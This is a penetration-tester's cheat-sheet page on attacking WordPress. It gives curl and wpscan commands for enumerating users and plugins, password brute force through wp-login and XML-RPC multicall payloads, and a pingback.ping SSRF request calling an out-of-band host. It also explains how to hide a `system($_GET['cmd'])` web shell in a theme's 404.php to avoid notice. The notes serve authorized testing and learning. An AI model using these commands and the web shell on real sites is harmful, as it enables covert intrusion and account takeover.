---
title: pentesting wordpress
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - wordpress
  - pentesting
---

# Pentesting wordpress


## Enumeration

### Dorking techniques

```
inurl:"/xmlrpc.php?rsd" + scoping restrictions

intitle:"WordPress" inurl:"readme.html" + scoping restrictions = general wordpress detection

allinurl:"wp-content/plugins/" + scoping restrictions = general wordpress detection
```


### Wordpress version 

```bash
# Using curl 
curl -s -X GET https://example.com | grep '<meta name="generator"'

```

### Plugin enumeration

```bash
# curl
curl -s -X GET http://example.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

# wpscan
wpscan --url http://<TARGET> --plugins-detection passive
# Modes: -mixed (default), -passive or -active

```

### Themes enumeration

```bash
# Using curl
curl -s -X GET http://example.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```


### User enumeration


```bash
# Using curl
curl -s -I -X GET http://blog.inlanefreight.com/?author=1

# json enumeration
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq

# wpscan
wpscan --url https://target.tld/domain --enumerate u
wpscan --url https://target.tld/ -eu

# Enumerate a range of users 1-100
wpscan --url https://target.tld/ --enumerate u1-100
wpscan --url http://46.101.13.204:31822 --plugins-detection passive


```

Manual method: users in wordpress have unique identifiers. Usually first user in wordpress has id 1. Second user, id 2. So in the browser you can write:

```
http://example.com/wordpressPath?author=1
```


## Brute force attack on login

Usually, login form is located at example.com/wp-admin/login.php

But sometimes, login form is hidden under a different path. There exist plugins to do so.

```bash
# Brute force attack with passwords
wpscan --url HOST/domain -usernames admin, webadmin  --password-attack wp-login -passwords filename.txt
# -usernames: those users that you are going to brute force
# --password-attack: your URI target (different in the case of the WP api
# -passwords: path/to/dictionary.txt
```



## WordPress xmlrpc attacks 

XML-RPC on WordPress is actually an API that allows developers who make 3rd party application and services the ability to interact to your WordPress site. The XML-RPC API that WordPress provides several key functionalities that include:

- Publish a post.
- Edit a post.
- Delete a post.
- Upload a new file (e.g. an image for a post).
- Get a list of comments.
- Edit comments.

XML-RPC functionality is turned on by default since WordPress 3.5. Therefore, normal installation of wordpress allows us to perform two type of attacks:

- XML-rpc ping attacks.
- Brute force attack.


**Before attacking**, we need to make sure that there exist XML-RPC servers on the wordpress installation:

**1.** Ensure you have access to the xmlrpc.php file (usually at https://example.com/xmlrpc.php). 

**2.** Send a POST request: .

```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 135

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```

Same request with curl would be:

```
curl -X POST -d "<?xml version=\"1.0\" encoding=\"utf-8\"?> <methodCall> <methodName>system.listMethods</methodName> <params></params></methodCall>" http://example.com/xmlrpc.php
```

Normal response to this request would be listing all available methods.


### XML-RPC brute force attack

With wpscan:

```bash
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://<TARGET>
```

Use BurpSuite Intruder to send this request:

```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 235

<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
```

You can also perform a single request, and brute force hundreds of passwords. For that you need to use both system.multicall and wp.getUsersBlogs methods:

```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 1560

<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>\{\{ Your Username \}\}</string></value><value><string>\{\{ Your Password \}\}</string></value></data></array></value></data></array></value></member></struct></value>

</data></array></value></param></params></methodCall>
```


### XML-RPC pingback attack: Distributed denial-of-service (DDoS) attacks 

An attacker executes the pingback.ping the method from several affected WordPress installations against a single unprotected target (botnet level).


### XML-RPC pingback attack: Cloudflare Protection Bypass

An attacker executes the pingback.ping the method from a single affected WordPress installation which is protected by CloudFlare to an attacker-controlled public host (for example a VPS) in order to reveal the public IP of the target, therefore bypassing any DNS level protection.


### XML-RPC pingback attack: XSPA (Cross Site Port Attack) 

An attacker can execute the pingback.ping the method from a single affected wordpress installation to the same host (or other internal/private host) on different ports. An open port or an internal host can be determined by observing the difference in time of response and/or by looking at the response of the request.


The following represents an simple example request using the Burpsuite Collaborator provided URL as callback:

```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 303

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://pdaskjdasas23fselrkfdsf.oastify.com/1562017983221-4377199190203</string></value>
</param>
<param>
<value><string>https://example.com/</string></value>
</param>
</params>
</methodCall>
```


```bash
# Brute force with curl
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

# If the credentials are not valid, we will receive a 403 faultCode error.
```



## RCE attack on wordpress

Once you have credentials for user admin, access the admin panel and introduce a web shell. Where? Appearance > Theme editor. Choose a theme not in use and edit 404.php to add the shell. This is a quiet way not to be noticed.

At the end of the file, you can add:

```php
system($_GET['cmd']);
```

**Exploitation**:

```bash
curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

## Metasploit modules

```msf
use exploit/unix/webapp/wp_admin_shell_upload
```


## Interesting files

If somehow we get our hands on wp-config.php, then we will be able to see credentials to database. 



## Tools


[wpscan](wpscan.md)
